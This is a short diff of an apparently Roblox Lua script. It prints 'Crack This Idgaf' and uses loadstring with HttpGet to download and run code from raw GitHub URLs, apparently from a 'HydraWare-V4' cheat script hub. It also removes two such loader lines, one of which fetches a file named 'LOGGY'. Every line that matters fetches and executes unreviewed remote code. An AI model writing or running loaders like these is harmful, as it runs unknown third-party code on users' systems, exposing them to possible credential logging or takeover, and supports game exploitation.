@@ -3,5 +3,3 @@ local A = "Crack This Idgaf"
 print(A)
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/freshlocaliar2mgiadawdpaklsd/HydraWare-V4/main/Script",true))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/EfialCheese/WAITCHEESE/main/LOGGY",true))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/freshlocaliar2mgiadawdpaklsd/HydraWare-V4/main/Emojis",true))()
